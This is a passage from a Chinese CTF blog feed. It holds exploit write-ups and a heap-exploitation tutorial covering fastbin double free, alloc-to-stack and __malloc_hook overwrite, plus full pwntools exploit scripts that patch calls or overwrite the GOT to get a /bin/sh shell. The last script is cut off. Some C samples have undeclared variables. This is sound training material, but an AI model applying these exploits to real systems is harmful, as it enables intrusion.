*)&amp;buf_1);</code>的调用puts，改为调用system。</p><p>第一个read读入5个字节，前4个字节在buf_1里，要修改的地址，第5个字节在buf_2里，使要修改成的内容。</p><p>为了修改最后一次运行的puts为system，我们第一次read前四个字节为<code>call  &lt;puts@plt&gt;</code>的地址</p><p>我们的目标为把<code>call  &lt;puts@plt&gt;</code>修改为<code>call  &lt;system@plt&gt;</code>，这里就要看call函数的16进制表示：</p><p><img src="https://pic.imgdb.cn/item/60bdaf6e844ef46bb24d793c.png"></p><p>即 call _puts对应的汇编为 <code>E8 3A FD FF FF</code>.</p><p>学习之后知道E8代表call 后面的  3A FD FF FF  为小端序的偏移，该偏移是基于call指令下一条指令与call函数调用的plt的函数地址的偏移，在32位程序中，小端序的 3A FD FF FF 为负数，即往上跳到puts的plt表。</p><p>小端序 3A FD FF FF 转化为16进制为0xFFFFFD3A , 转化为10进制为 -710 ，call的下一条指令为</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.text:08048796                 add     esp, 10h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>而<strong>0x08048796 +  0xFFFFFD3A = 0x80484D0</strong></p><p><img src="https://pic.imgdb.cn/item/60bdb277844ef46bb289edda.png"></p><p>而0x80484D0正好是<strong>puts@plt</strong>的地址说明计算是正确的</p><p>我们的目标就修改为<strong>system@plt</strong>，即修改为0x80484E0，计算偏移：</p><p><strong>0x80484E0 - 0x08048796 = 0xFFFFFD4A</strong></p><p>即我们需要修改16进制汇编为 <strong>E8 4A FD FF FF</strong>,且原汇编为<strong>E8 3A FD FF FF</strong></p><p>正好相差一个字节，我们需要修改原来的3A为4A即可</p><p>由于原汇编的地址也就是call的地址是：0x08048791，修改call的第二个字节的地址则为0x08048792.</p><p>到这里两次read的内容就明确了：</p><p>第一次read ： p32(0x08048792)+p8(4A)</p><p>第二次read ： ‘/bin/sh’</p><p>即可修改第二次puts为system(“/bin/sh”);得到shell</p><p>也可以直接在ida里patch查看修改后的效果：</p><p><img src="https://pic.imgdb.cn/item/60bdb4b5844ef46bb2b65e94.png"></p><h2 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span><span class="token comment">#p = remote("118.190.62.234", "12435")</span>payload1 <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">0x08048792</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x4A</span><span class="token punctuation">)</span><span class="token comment">#修改puts为system</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"pwn this\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"name?"</span><span class="token punctuation">,</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token comment">#填入system参数</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>还是对汇编和汇编的16进制的表示不太熟悉，线下做题的时候对原函数的反汇编还是没有理解太清楚，程序运行过程还有些模糊。</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>libc2.27_unlink_OffByNull</title>
      <link href="//post/libc2-27-unlink-OffByNull.html"/>
      <url>//post/libc2-27-unlink-OffByNull.html</url>
      
        <content type="html"><![CDATA[<h1 id="glibc2-27下的利用null-off-by-one构造unlink"><a href="#glibc2-27下的利用null-off-by-one构造unlink" class="headerlink" title="glibc2.27下的利用null off by one构造unlink"></a>glibc2.27下的利用null off by one构造unlink</h1><h2 id="PWN-GKCTF-2020-Domo分析"><a href="#PWN-GKCTF-2020-Domo分析" class="headerlink" title="[PWN]GKCTF 2020 Domo分析"></a>[PWN]GKCTF 2020 Domo分析</h2>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-LearnHeap</title>
      <link href="//post/pwn-LearnHeap.html"/>
      <url>//post/pwn-LearnHeap.html</url>
      
        <content type="html"><![CDATA[<h1 id="LearnHeap"><a href="#LearnHeap" class="headerlink" title="LearnHeap"></a>LearnHeap</h1><p>不出意外这篇文章我因该会对照着ctfhub的pwn的规划来写 ：）</p><span id="more"></span><h1 id="Fastbin-Attack"><a href="#Fastbin-Attack" class="headerlink" title="Fastbin Attack"></a>Fastbin Attack</h1><p>Fastbin Attack是基于fastbin的一类漏洞利用的方法，这些利用有一些前提：</p><ul><li>有堆溢出，uaf等漏洞，可以控制chunk内容</li><li>漏洞发生在fastbin类型的chunk之中</li></ul><p>漏洞主要原理在于Fastbin是通过单链表管理的，并且释放fastbin的chunk的时候不会清空next chunk的pre_in_use位。</p><h2 id="Fastbin"><a href="#Fastbin" class="headerlink" title="Fastbin"></a>Fastbin</h2><p>fastbin所包含chunk的大小为16 Bytes, 24 Bytes, 32 Bytes, … , 80 Bytes。当分配一块较小的内存(mem&lt;=64 Bytes)时，会首先检查对应大小的fastbin中是否包含未被使用的chunk，如果存在则直接将其从fastbin中移除并返回；否则通过其他方式（剪切top chunk）得到一块符合大小要求的chunk并返回。</p><p>而当free一块chunk时，也会首先检查其大小是否落在fastbin的范围中。如果是，则将其插入对应的bin中。顾名思义，fastbin为了快速分配回收这些较小size的chunk，并没对之前提到的bk进行操作，即仅仅通过fd组成了单链表而非双向链表，而且其遵循后进先出(LIFO)的原则。</p><p>但如果能够修改fd内容，那么在随后的malloc时便可能将修改后的地址返回，这进一步往往能够造成向任意地址写任意内容(write-anything-anywhere)的后果。</p><p>每个fast bin都记录着一条free chunk的单链表（称为binlist ，采用单链表是出于fast bin中链表中的chunk不会被摘除的特点），增删chunk都发生在链表的前端。</p><p><strong>关键：</strong></p><ol><li>fastbin大小&lt;=64B（32位）[64位为128B]，fastbins中的chunk不改变它的<code>prev_inuse</code>标志，也就无法被合并</li><li>首块double free检查，当一个chunk被free进fastbin前，会看看链表的第一个chunk【main_arena直接指向的块】是不是该chunk，如果是，说明double free了就报错，而对于链表后面的块，并没有进行验证。</li></ol><h2 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>Fastbin Double Free是指fastbin的chunk可以被多次释放，导致同一个chunk可以在fastbin链表中多次存在。这样分配的时候就可以实现多个指针指向同一个堆块，这样，根据不同指针对于堆块内容的用处不用，就能实现类型混淆的效果</p><p>这个方法可以成功有两个原因：</p><ul><li>堆块被释放后没用清空next chunk的pre_in_use位</li><li>fastbin在进行free的时候只检查main_arena直接指向的块，对于之后的块并没有检查。</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">,</span> <span class="token operator">*</span>chunk2<span class="token punctuation">;</span>    chunk0 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    chunk1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">free</span><span class="token punctuation">(</span>chunk0<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>chunk0<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img.imgdb.cn/item/6073efb68322e6675c27378f.png"></p><p>这样free在第三次释放后fd的值不为0而是指向chunk2</p><p>如果在这时，我们能够控制chunk0的内容，就可以改写fd从而在我们想要的的地址分配fastbin块（要注意大小必须和该fastbin链表的大小一致）。从而实现任意地址写。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//main_arena -> chunk1 ->chunk0</span><span class="token comment">//p指向use_chunk的data段，即在free_chunk的fd指针处</span><span class="token comment">//此时往改chunk内填入内容相当于覆盖fd指针</span><span class="token function">eidt</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//将chunk0的fd改为我们需要的地址（fake_chunk）</span><span class="token comment">//main_arena -> chunk1 -> chunk0 -> fake_chunk</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//chunk1</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//chunk0</span><span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//fake_chunk</span><span class="token comment">//则此时p可以指向任意一合适位置，并进行修改</span><span class="token comment">//合适位置指的是需要size位符合！！</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h2><p>见我的这篇博文：<a href="https://mark0519.github.io/2021/03/24/pwn-easyheap-1/">https://mark0519.github.io/2021/03/24/pwn-easyheap-1/</a></p><h2 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to Stack"></a>Alloc to Stack</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>该技术的核心点在于劫持 fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据，比如返回地址等。</p><p>通过该技术我们可以把 fastbin chunk 分配到栈中，从而控制返回地址等关键数据。要实现这一点我们需要劫持 fastbin 中 chunk 的 fd 域，把它指到栈上，当然同时需要栈上存在有满足条件的 size 值。</p><h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p>这次我们把 fake_chunk 置于栈中称为 stack_chunk，同时劫持了 fastbin 链表中 chunk 的 fd 值，通过把这个 fd 值指向 stack_chunk 就可以实现在栈中分配 fastbin chunk。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_chunk</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> pre_size<span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> size<span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> fd<span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> bk<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> CHUNK<span class="token punctuation">,</span><span class="token operator">*</span>PCHUNK<span class="token punctuation">;</span><span class="token comment">//经过gdb调试可以看出，改结构体的地址（&amp;stack_chunk）指向pre_size,size位在pre_size+8处。</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    CHUNK stack_chunk<span class="token punctuation">;</span><span class="token comment">//fake_chunk in stack</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk_shell<span class="token punctuation">;</span>    stack_chunk<span class="token punctuation">.</span>size<span class="token operator">=</span><span class="token number">0x21</span><span class="token punctuation">;</span> <span class="token comment">//构造fake_chunk的size位</span>    p_chunk1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//构建size位为0x21的真chunk（在堆中）</span>    <span class="token function">free</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//放入fastbin</span><span class="token comment">//main_arena -> chunk1 ->0x00</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span>p_chunk1 <span class="token operator">=</span> <span class="token operator">&amp;</span>stack_chunk<span class="token punctuation">;</span><span class="token comment">//将fake_chunk（在栈上）的地址填入chunk1（的fd指针）</span>    <span class="token comment">/*    p_chunk1是指向chunk1的数据区的指针，    在chunk1被free之后，p_chunk1指向chunk1的fd位。    *p_chunk1代表chunk1的fd位置。    (long long *)为类型转换。    */</span>    <span class="token comment">//main_arena -> chunk1 -> &amp;stack_fake -> 0x00</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//拿出chhunk1</span>    chunk_shell <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//得到在栈上的chunk，即可修改返回地址等关键参数</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h2><p>Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，唯一的区别是分配的目标不再是栈中。 事实上只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如 bss、heap、data、stack 等等。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk_a<span class="token punctuation">;</span>    <span class="token comment">//$ x/20gx &amp;__malloc_hook (find malloc_hook addr)</span>    chunk1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//hook之上存在0x0000000007f</span>    <span class="token function">free</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//malloc_hook_addr = 0x7ffff7dd1b10</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span>chunk1 <span class="token operator">=</span> <span class="token number">0x7ffff7dd1af0</span><span class="token operator">-</span><span class="token number">0x3</span><span class="token punctuation">;</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    chunk_a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="2014-hack-lu-oreo"><a href="#2014-hack-lu-oreo" class="headerlink" title="2014 hack.lu oreo"></a>2014 hack.lu oreo</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">"./oreo"</span>oreo <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./oreo"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./oreo"</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'PID: '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>descrip<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    <span class="token comment">#p.recvuntil('Rifle name: ')</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span>    <span class="token comment">#p.recvuntil('Rifle description: ')</span>    <span class="token comment">#sleep(0.5)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>descrip<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_rifle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'===================================\n'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">order</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">message</span><span class="token punctuation">(</span>notice<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    <span class="token comment">#p.recvuntil("Enter any notice you'd like to submit with your order: ")</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>notice<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token string">'step 1. leak libc base'</span>    name <span class="token operator">=</span> <span class="token number">27</span> <span class="token operator">*</span> <span class="token string">'a'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>oreo<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">25</span> <span class="token operator">*</span> <span class="token string">'a'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>    show_rifle<span class="token punctuation">(</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'===================================\n'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Description: '</span><span class="token punctuation">)</span>    puts_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'puts addr: '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>    system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>    binsh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">'step 2. free fake chunk at 0x0804A2A8'</span>        oifle <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">while</span> oifle <span class="token operator">&lt;</span> <span class="token number">0x3f</span><span class="token punctuation">:</span>        add<span class="token punctuation">(</span><span class="token number">25</span> <span class="token operator">*</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">27</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        oifle <span class="token operator">+=</span> <span class="token number">1</span>    payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">27</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x0804a2a8</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">25</span> <span class="token operator">*</span> <span class="token string">'a'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token number">0x20</span> <span class="token operator">*</span> <span class="token string">'\x00'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">52</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">)</span>    message<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    order<span class="token punctuation">(</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Okay order submitted!\n'</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>oreo<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'strlen'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token string">'b'</span> <span class="token operator">*</span> <span class="token number">20</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system addr: '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    message<span class="token punctuation">(</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">';/bin/sh\x00'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2015-9447-CTF-Search-Engine"><a href="#2015-9447-CTF-Search-Engine" class="headerlink" title="2015 9447 CTF : Search Engine"></a>2015 9447 CTF : Search Engine</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">"linux"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./search-bf61fbb8fa7212c814b2607a81a84adf'</span><span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x400e23</span>system_offset <span class="token operator">=</span> <span class="token number">0x46590</span>puts_offset <span class="token operator">=</span> <span class="token number">0x6fd60</span>binsh_offset <span class="token operator">=</span> <span class="token number">1558723</span><span class="token keyword">def</span> <span class="token function">leak_stack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">48</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Quit\n'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">48</span><span class="token punctuation">)</span>    leak <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>leak<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">leak_libc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    index_sentence<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">12</span> <span class="token operator">+</span> <span class="token string">' b '</span><span class="token punctuation">)</span><span class="token 